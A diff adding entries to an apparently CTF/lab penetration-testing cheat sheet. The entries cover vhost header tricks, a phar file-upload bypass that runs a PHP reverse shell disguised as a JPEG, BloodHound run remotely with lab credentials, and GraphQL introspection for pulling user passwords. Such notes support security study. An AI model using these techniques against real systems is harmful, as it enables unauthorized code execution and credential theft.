@@ -590,6 +590,28 @@ git log
 git show <each commit>
 ```
 
+Check .htaccess, see if there are any special Headers that you need to supply, check whether there is anything mentioning virtual hosts.
+
+To modify vhost you would switch "Host: 10.10.11.177" to "Host: dev.siteisup.htb".
+
+#### Bypassing File Upload Extension with Phar
+
+Phar is basicaly a zip that allows you to navigate to files within and execute with PHP. You can simply rename the phar to another extension name, such as jpeg.
+
+Note that is your php reverse shell isn't working, but you can echo strings, check phpinfo() for disable_functions and see what you're able to run. An example of proc_open is in scripts directory.
+
+
+```bash
+zip test.phar reverse.php
+mv test.phar test.jpeg
+
+GET /?page=phar://uploads/test.jpeg/reverse
+```
+
+#### Automatically Adding Custom Header in BurpSuite
+
+Go to Proxy > Options > Scroll Down to Match and Replace > Add the header in Replace section
+
 #### Cracking Zip File
 
 ```bash
@@ -805,6 +827,27 @@ impacket-GetADUsers -dc-ip 192.168.214.122 exampleH.example/fmcsorley:CrabSharkJ
 
 #### Run BloodHound Remotely
 
+If you have creds for LDAP/RPC/SMB but you can't get a shell, run BloodHound remotely to see what you can find.
+
 ```bash
 /opt/BloodHound.py/bloodhound.py -d exampleH.example -u fmcsorley -p CrabSharkJellyfish192 -c all -ns 192.168.214.122
 ```
+
+#### GraphQL
+
+Navigate to "http://site.com/graphql/". Then, you want to extract information.
+
+```bash
+{__schema {
+   types {
+      name
+      kind
+      description
+      fields {
+         name
+      }
+   }
+}}
+```
+
+Url encode that, then query it within the url, "http://site.com/graphql?query=%7B__schema%20%7B%0A%20%20%20types%20%7B%0A%20%20%20%20%20%20name%0A%20%20%20%20%20%20kind%0A%20%20%20%20%20%20description%0A%20%20%20%20%20%20fields%20%7B%0A%20%20%20%20%20%20%20%20%20name%0A%20%20%20%20%20%20%7D%0A%20%20%20%7D%0A%7D%7D". Say there's a user object with a password and you want to query what it is, you can do that by putting "{ user { username, password } }"
